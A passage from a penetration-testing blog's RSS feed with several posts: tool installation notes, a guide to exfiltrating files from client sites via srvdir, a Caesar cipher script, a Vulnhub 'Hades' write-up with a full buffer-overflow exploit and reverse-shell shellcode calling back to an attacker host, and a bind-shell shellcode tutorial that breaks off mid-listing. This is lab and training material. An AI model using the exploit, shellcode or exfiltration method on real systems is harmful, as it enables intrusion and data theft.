ln -s /usr/local/armitage/teamserver /usr/local/bin/teamserver
</code></pre></div><p>Due to the way variables are handled when using sudo, you will need to give the –E option.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo –E armitage
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo –E msfconsole
</code></pre></div><p>Special thanks to <a href="https://twitter.com/SyphonPhreak">@Syph0n</a> for creating this article</p>
<p>Keep on sploiting,</p>
<p>norsec0de</p>
]]></content>
        </item>
        
        <item>
            <title>installing unicornscan on debian/ubuntu</title>
            <link>https://www.pwnd.red/posts/installing-unicornscan-on-debianubuntu/</link>
            <pubDate>Sat, 19 Jul 2014 09:19:23 +0000</pubDate>
            
            <guid>https://www.pwnd.red/posts/installing-unicornscan-on-debianubuntu/</guid>
            <description>Looking back, I can&amp;rsquo;t remember a time where I used Nmap to perform UDP port scans. Pentesters are far too impatient to spend hours waiting for a UDP scan to finish in the hope of finding some badly configured service. Which is why I found it odd when I received a message saying &amp;ldquo;why do UDP scans take hours?&amp;rdquo;
It never occurred to me that this poor dude was staring at the screen, Nmap torturing him every 30 seconds by telling him he won&amp;rsquo;t be done with this machine any time this week.</description>
            <content type="html"><![CDATA[<p>Looking back, I can&rsquo;t remember a time where I used Nmap to perform UDP port scans. Pentesters are far too impatient to spend hours waiting for a UDP scan to finish in the hope of finding some badly configured service. Which is why I found it odd when I received a message saying &ldquo;<em>why do UDP scans take hours?</em>&rdquo;</p>

    <img src="https://i.imgur.com/o2oQR4a.png"  class="left"  />


<p>It never occurred to me that this poor dude was staring at the screen, Nmap torturing him every 30 seconds by telling him he won&rsquo;t be done with this machine any time this week. I told him about this gem of a payload transmitter that just also happened to be an epic UDP port scanner, largely forgotten since the sad departure of the late Jack C. Louis. And seeing as this was a client supplied &lsquo;jump-box&rsquo; and not something handy like Kali, I decided to take a crack at installing and showing the tester good ol' <a href="http://www.unicornscan.org/">unicornscan</a>.</p>
<blockquote>
<p><em>I didn&rsquo;t realise installing unicornscan would take longer than the Nmap UDP scan itself</em></p>
</blockquote>

    <img src="https://i.imgur.com/0enTmxF.png"  class="left"  />


<p>Many, MANY hours later I finally got unicornscan working and decided to make a note on how to deploy this on an updated debian distro circa 2014.</p>
<p>Get the dependencies installed:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo apt-get install postgresql libdnet-dev libpq-dev libpcap-dev bison flex
</code></pre></div><p>Download and Install unicornscan:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">wget http://sourceforge.net/projects/osace/files/unicornscan/unicornscan%20-%200.4.7%20source/unicornscan-0.4.7-2.tar.bz2/download -O unicornscan-0.4.7-2.tar.bz2
tar jxvf unicornscan-0.4.7-2.tar.bz2
cd unicornscan-0.4.7/
./configure CFLAGS<span style="color:#f92672">=</span>-D_GNU_SOURCE
make
sudo make install
</code></pre></div><p>Hope this helps anyone stuck trying to get unicornscan up and running.</p>
<p>Keep on sploiting,</p>
<p>norsec0de</p>
]]></content>
        </item>
        
        <item>
            <title>data exfiltration over SSL with srvdir</title>
            <link>https://www.pwnd.red/posts/data-exfiltration-over-ssl-with-srvdir/</link>
            <pubDate>Sun, 15 Jun 2014 04:31:04 +0000</pubDate>
            
            <guid>https://www.pwnd.red/posts/data-exfiltration-over-ssl-with-srvdir/</guid>
            <description>Every now and then I come across some application that may (or may not) have been developed with penetration testing in mind but it ends up being damn helpful all the same. Yesterday I found a post about srvdir which is designed to share content over SSL/TLS via a public site.
When trying to exfiltrate data from a client site I normally spend a lot of time setting up tunnels, using disposable A records from afraid.</description>
            <content type="html"><![CDATA[
<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/G6oFcSJtOro" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>

<p><!-- raw HTML omitted --></p>
<p>Every now and then I come across some application that may (or may not) have been developed with penetration testing in mind but it ends up being damn helpful all the same. Yesterday I found a post about <a href="https://www.srvdir.net">srvdir</a> which is designed to share content over SSL/TLS via a public site.</p>
<p>When trying to exfiltrate data from a client site I normally spend a lot of time setting up tunnels, using disposable A records from <a href="http://freedns.afraid.org">afraid.org</a> and one of my boxes in some east-european cave just so I can get the damn &lsquo;payroll-summary-june-2014.pdf&rsquo; trophy off some box that is swimming in ssh-tunnel-fu. srvdir is the perfect answer to this problem and testing it has been awesome and full of those &ldquo;Why didn&rsquo;t I think of this?!!&rdquo; rants.</p>
<p>Essentially, what srvdir does is to create a SSL tunnel to the mothership &lsquo;srvdir.net&rsquo; and issue a subdomain that can be accessed externally to siphon the files off. Grabbing files is relatively painless with the odd 404 for the permission snobs. It supports basic http-auth for the paranoid and by the looks of it, tokens as well. It runs seamlessly on Windows, Linux and OSX and is relatively small.</p>
<p>To get the file, use wget:</p>
<p>Windows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">wget.exe --no-check-certificate https://dl.srvdir.net/windows_386/srvdir.zip
</code></pre></div><p>Mac OSX:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">wget --no-check-certificate https://dl.srvdir.net/darwin_amd64/srvdir.zip
</code></pre></div><p>Linux:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">wget --no-check-certificate https://dl.srvdir.net/linux_386/srvdir.zip
</code></pre></div><p>Unzip the file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">unzip srvdir.zip
</code></pre></div><p>Help</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">./srvdir -h
</code></pre></div>
    <img src="https://i.imgur.com/gUKF0xI.png"  class="left"  />


<p>Usage:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">./srvdir [-auth=&#34;username:password&#34;] subdomain:path
</code></pre></div><p>Share current folder with custom subdomain</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">./srvdir norsec0de:.
</code></pre></div>
    <img src="https://i.imgur.com/mtXOTno.png"  class="left"  />


<p>Share current folder with random subdomain</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">./srvdir
</code></pre></div>
    <img src="https://i.imgur.com/JZ02ZGa.png"  class="left"  />


<p>Keep on sploiting,</p>
<p>norsec0de</p>
]]></content>
        </item>
        
        <item>
            <title>very simple caesar cipher in python</title>
            <link>https://www.pwnd.red/posts/very-simple-caesar-cipher-python/</link>
            <pubDate>Mon, 26 May 2014 05:53:11 +0000</pubDate>
            
            <guid>https://www.pwnd.red/posts/very-simple-caesar-cipher-python/</guid>
            <description>During a recent CTF I needed to decrypt a page encrypted with a Caesar Cipher. I didn&amp;rsquo;t know the what the ROT was and I was struggling to find an easy yet useful one around so I wrote this pure python one.
Feel free to borrow it, steal it, claim it as your own or do whatever with it.
Keep on sploiting,
norsec0de
#!/usr/bin/python # Very Simple Caesar Cipher # by norsec0de #  # python .</description>
            <content type="html"><![CDATA[<p>During a recent CTF I needed to decrypt a page encrypted with a <a href="https://en.wikipedia.org/wiki/Caesar_cipher">Caesar Cipher</a>. I didn&rsquo;t know the what the ROT was and I was struggling to find an easy yet useful one around so I wrote this pure python one.</p>
<p>Feel free to borrow it, steal it, claim it as your own or do whatever with it.</p>
<p>Keep on sploiting,</p>
<p>norsec0de</p>
<p><!-- raw HTML omitted --></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>

<span style="color:#75715e"># Very Simple Caesar Cipher</span>
<span style="color:#75715e"># by norsec0de</span>
<span style="color:#75715e"># </span>
<span style="color:#75715e"># python ./caesar.py</span>
<span style="color:#75715e"># </span>

<span style="color:#f92672">import</span> sys

<span style="color:#75715e"># Encrypt Plain Text</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">caesar</span>(plainText, key<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>): 
	cipherText <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
	<span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> plainText:
		<span style="color:#66d9ef">if</span> c<span style="color:#f92672">.</span>isalpha():
			<span style="color:#66d9ef">if</span> c<span style="color:#f92672">.</span>isupper():
				caps <span style="color:#f92672">=</span> True
			<span style="color:#66d9ef">else</span>:
				caps <span style="color:#f92672">=</span> False
			alphabet <span style="color:#f92672">=</span> ord(c<span style="color:#f92672">.</span>lower()) <span style="color:#f92672">+</span> key 
			<span style="color:#66d9ef">if</span> alphabet <span style="color:#f92672">&gt;</span> ord(<span style="color:#e6db74">&#39;z&#39;</span>):
				alphabet <span style="color:#f92672">-=</span> <span style="color:#ae81ff">26</span>
			letter <span style="color:#f92672">=</span> chr(alphabet)
			<span style="color:#66d9ef">if</span> caps <span style="color:#f92672">is</span> True:
				letter <span style="color:#f92672">=</span> letter<span style="color:#f92672">.</span>upper()
			cipherText <span style="color:#f92672">+=</span> letter
		<span style="color:#66d9ef">else</span>:
			cipherText <span style="color:#f92672">+=</span> c
	<span style="color:#66d9ef">return</span> cipherText

<span style="color:#75715e"># Brute force all 26 possibilities.</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">guess_caesar</span>(plainText):
	<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;Showing all combinations for text &#39;</span> <span style="color:#f92672">+</span> plainText
	key <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
	<span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">26</span>):
		cipherText <span style="color:#f92672">=</span> caesar(plainText, key)
		<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;Key &#39;</span> <span style="color:#f92672">+</span> str(key) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; =&gt; &#39;</span> <span style="color:#f92672">+</span> cipherText
		key <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>

<span style="color:#75715e"># Usage</span>
<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
	<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Caesar Cypher Tool&#39;</span>
	<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> Usage: &#39;</span> <span style="color:#f92672">+</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; (options) &lt;text&gt; &lt;rot key&gt;&#39;</span>
	<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74"> encrypt         =&gt; </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">Text to encrypt</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> &lt;key&gt;&#39;</span>
	<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74"> decrypt         =&gt; -d </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">Text to decrypt</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> &lt;key&gt;&#39;</span>
	<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74"> decrypt file    =&gt; -f &lt;filename&gt; &lt;key&gt;&#39;</span>
	<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74"> brute force     =&gt; -b </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">Cyphertext</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> 

<span style="color:#75715e"># Brute force</span>
<span style="color:#66d9ef">elif</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-b&#39;</span>:
	plainText <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]
	cipherText <span style="color:#f92672">=</span> guess_caesar(plainText)
	<span style="color:#66d9ef">print</span> cipherText

<span style="color:#75715e"># Decode a string</span>
<span style="color:#66d9ef">elif</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-d&#39;</span>:
	plainText <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]
	key <span style="color:#f92672">=</span> int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">3</span>])
	cipherText <span style="color:#f92672">=</span> caesar(plainText, key)
	<span style="color:#66d9ef">print</span> cipherText

<span style="color:#75715e"># Decode a File</span>
<span style="color:#66d9ef">elif</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-f&#39;</span>:
	infile <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]
	key <span style="color:#f92672">=</span> int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">3</span>])
	<span style="color:#66d9ef">with</span> open(infile, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
		<span style="color:#66d9ef">while</span> True:
			line <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readline()
			<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> line: 
				<span style="color:#66d9ef">break</span>
			<span style="color:#66d9ef">print</span> caesar(line, key)

<span style="color:#75715e"># Encode a String</span>
<span style="color:#66d9ef">else</span>:
	plainText <span style="color:#f92672">=</span> str(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>])
	key <span style="color:#f92672">=</span> int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>])
	cipherText <span style="color:#f92672">=</span> caesar(plainText, key)
	<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Encrypting </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> plainText <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> with ROT&#39;</span> <span style="color:#f92672">+</span> str(key) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; =&gt; &#34;</span> <span style="color:#f92672">+</span> cipherText <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#39;</span>

</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>cracking the infernal hades</title>
            <link>https://www.pwnd.red/posts/cracking-the-infernal-hades/</link>
            <pubDate>Fri, 16 May 2014 06:53:11 +0000</pubDate>
            
            <guid>https://www.pwnd.red/posts/cracking-the-infernal-hades/</guid>
            <description>About a month ago, Vulnhub released a boot2root image built by Lok_Sigma called Hades. The box promised to be full of annoyances and it delivered them in droves. Requiring a combination of exploit development, reverse engineering and some out of the box thinking, I really enjoyed this challenge. I decided to share my solution now that the competition is over. It goes without saying this post has a lot of SPOILERS!</description>
            <content type="html"><![CDATA[
<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/D3YJxeJKkRM" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>

<p>About a month ago, <a href="https://vulnhub.com/">Vulnhub</a> released a boot2root image built by <a href="https://vulnhub.com/author/lok_sigma,67/">Lok_Sigma</a> called Hades. The box promised to be full of annoyances and it delivered them in droves. Requiring a combination of exploit development, reverse engineering and some out of the box thinking, I really enjoyed this challenge. I decided to share my solution now that the competition is over. It goes without saying this post has a lot of SPOILERS!</p>
<p>Big thanks go out to the Vulnhub team for the awesome work they do. Follow <a href="https://twitter.com/VulnHub">@vulnhub</a> on Twitter to keep up with the latest releases.</p>
<p>If you want to tackle Hades yourself, you can grab a copy of the machine <a href="https://vulnhub.com/entry/the-infernal_hades,61/">here</a>.</p>
<p>Keep on sploiting,</p>
<p>norsec0de</p>
<p><!-- raw HTML omitted --></p>
<h1 id="commands-used">Commands Used</h1>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt"># Host Discovery
netdiscover -r 10.0.0.0/24

# Service Enumeration
nmap -v -sS -T4 -n -p- 10.0.0.129 &amp;&amp; us -mU -v -p 1-65535 10.0.0.129

# Base64 Decryption
base64 -d ssh-hades &amp;gt; hades.bin

# Pattern Creation
/opt/metasploit-framework/tools/pattern_create 1000

# Offset Search
/opt/metasploit-framework/tools/pattern_offset.rb Af7A
/opt/metasploit-framework/tools/pattern_offset.rb 5Af6
/opt/metasploit-framework/tools/pattern_offset.rb 0x34654133

# Finding Assembly Shellcode
/opt/metasploit-framework/tools/metasm_shell.rb
metasm&gt; jmp $esp+80

# Reverse Shell Payload
msfpayload linux/x86/shell_reverse_tcp LHOST=10.0.0.130 LPORT=4444 R | msfencode -e x86/shikata_ga_nai -b \x00\x0a\x0d -t python

# Improved Shell
python -c &#34;import pty; pty.spawn(&#39;/bin/sh&#39;)&#34;

# File Decryption
openssl enc -d -aes-256-cbc -in flag.txt.enc -out flag.txt -pass file:key_file
</code></pre></div><p><!-- raw HTML omitted --></p>
<h2 id="finished-exploit---hades">Finished Exploit - Hades</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>

<span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span> struct

target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.0.0.129&#39;</span>
port <span style="color:#f92672">=</span> <span style="color:#ae81ff">65535</span>

<span style="color:#75715e"># Shellcode</span>
<span style="color:#75715e"># msfpayload linux/x86/shell_reverse_tcp LHOST=10.0.0.130 LPORT=4444 R | msfencode -e x86/shikata_ga_nai -b \x00\x0a\x0d -t python</span>
<span style="color:#75715e"># [*] x86/shikata_ga_nai succeeded with size 95 (iteration=1)</span>

buf <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xda\xc7\xd9\x74\x24\xf4\x5d\xba\xc4\xe0\xc2\x40\x2b</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc9\xb1\x12\x83\xed\xfc\x31\x55\x13\x03\x91\xf3\x20</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb5\x28\x2f\x53\xd5\x19\x8c\xcf\x70\x9f\x9b\x11\x34</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf9\x56\x51\xa6\x5c\xd9\x6d\x04\xde\x50\xeb\x6f\xb6</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68\x0b\x90\xc4\x05\x09\x90\xd9\x89\x84\x71\x69\x57</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc7\x20\xda\x2b\xe4\x4b\x3d\x86\x6b\x19\xd5\x36\x43</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xed\x4d\x21\xb4\x73\xe4\xdf\x43\x90\xa4\x4c\xdd\xb6</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf8\x78\x10\xb8</span><span style="color:#e6db74">&#34;</span>

<span style="color:#75715e"># Buffer</span>
<span style="color:#75715e">#buffer = &#39;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B&#39;</span>
buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">11</span>
buffer <span style="color:#f92672">+=</span> buf
buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">131</span><span style="color:#f92672">-</span><span style="color:#ae81ff">95</span><span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>)
buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xeb\x4e\x90\x90</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e"># esp - 0x2c</span>
buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;F&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">167</span><span style="color:#f92672">-</span><span style="color:#ae81ff">4</span><span style="color:#f92672">-</span><span style="color:#ae81ff">131</span>)
buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;B&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span> <span style="color:#75715e"># ebp</span>
buffer <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&amp;lt;L&#34;</span>,<span style="color:#ae81ff">0x08048694</span>) <span style="color:#75715e"># eip</span>
buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;D&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">1000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">4</span><span style="color:#f92672">-</span><span style="color:#ae81ff">4</span><span style="color:#f92672">-</span><span style="color:#ae81ff">167</span>)

<span style="color:#75715e"># Connect and send payload</span>
s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
s<span style="color:#f92672">.</span>connect((target, port))
s<span style="color:#f92672">.</span>send(buffer)
data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
s<span style="color:#f92672">.</span>close()
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>part 3: cleaning and optimising shellcode</title>
            <link>https://www.pwnd.red/posts/part-3-cleaning-and-optimising-shellcode/</link>
            <pubDate>Thu, 24 Apr 2014 12:00:54 +0000</pubDate>
            
            <guid>https://www.pwnd.red/posts/part-3-cleaning-and-optimising-shellcode/</guid>
            <description>In Part 2: Building the shellcode, we created a bind shell on port 4444 which accepts connections from any host and then interacts with /bin/sh to facilitate remote code execution. Our shellcode however was littered with null bytes and would probably not be very useful if embedding in any exploit code.
In this final part, we will clean our code and remove any null bytes from our shellcode. We will also look at removing unnecessary instruction to make our shellcode smaller if possible.</description>
            <content type="html"><![CDATA[<p>In <a href="/posts/part-2-building-the-shellcode/">Part 2: Building the shellcode</a>, we created a bind shell on port 4444 which accepts connections from any host and then interacts with <code>/bin/sh</code> to facilitate remote code execution. Our shellcode however was littered with null bytes and would probably not be very useful if embedding in any exploit code.</p>
<p>In this final part, we will clean our code and remove any null bytes from our shellcode. We will also look at removing unnecessary instruction to make our shellcode smaller if possible. Lets get started.</p>
<p>Step one, lets take a look at our shellcode using objdump:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">objdump -D bindshell -M intel
</code></pre></div><pre><code class="language-objdump" data-lang="objdump">bindshell:     file format elf32-i386

Disassembly of section .text:

08048080 &lt;_start&gt;: 
8048080:	31 c0                	xor    eax,eax
8048082:	31 db                	xor    ebx,ebx
8048084:	b8 66 00 00 00       	mov    eax,0x66
8048089:	bb 01 00 00 00       	mov    ebx,0x1
804808e:	31 c9                	xor    ecx,ecx
8048090:	51                   	push   ecx
8048091:	6a 01                	push   0x1
8048093:	6a 02                	push   0x2
8048095:	89 e1                	mov    ecx,esp
8048097:	cd 80                	int    0x80
8048099:	89 c2                	mov    edx,eax
804809b:	31 c0                	xor    eax,eax
804809d:	50                   	push   eax
804809e:	66 68 11 5c          	pushw  0x5c11
80480a2:	66 6a 02             	pushw  0x2
80480a5:	89 e1                	mov    ecx,esp
80480a7:	6a 10                	push   0x10
80480a9:	51                   	push   ecx
80480aa:	52                   	push   edx
80480ab:	31 c0                	xor    eax,eax
80480ad:	31 db                	xor    ebx,ebx
80480af:	b8 66 00 00 00       	mov    eax,0x66
80480b4:	bb 02 00 00 00       	mov    ebx,0x2
80480b9:	89 e1                	mov    ecx,esp
80480bb:	cd 80                	int    0x80
80480bd:	31 c0                	xor    eax,eax
80480bf:	50                   	push   eax
80480c0:	52                   	push   edx
80480c1:	89 e1                	mov    ecx,esp
80480c3:	b8 66 00 00 00       	mov    eax,0x66
80480c8:	31 db                	xor    ebx,ebx
80480ca:	bb 04 00 00 00       	mov    ebx,0x4
80480cf:	cd 80                	int    0x80
80480d1:	31 c0                	xor    eax,eax
80480d3:	50                   	push   eax
80480d4:	50                   	push   eax
80480d5:	52                   	push   edx
80480d6:	89 e1                	mov    ecx,esp
80480d8:	b8 66 00 00 00       	mov    eax,0x66
80480dd:	31 db                	xor    ebx,ebx
80480df:	bb 05 00 00 00       	mov    ebx,0x5
80480e4:	cd 80                	int    0x80
80480e6:	89 c2                	mov    edx,eax
80480e8:	31 c0                	xor    eax,eax
80480ea:	b8 3f 00 00 00       	mov    eax,0x3f
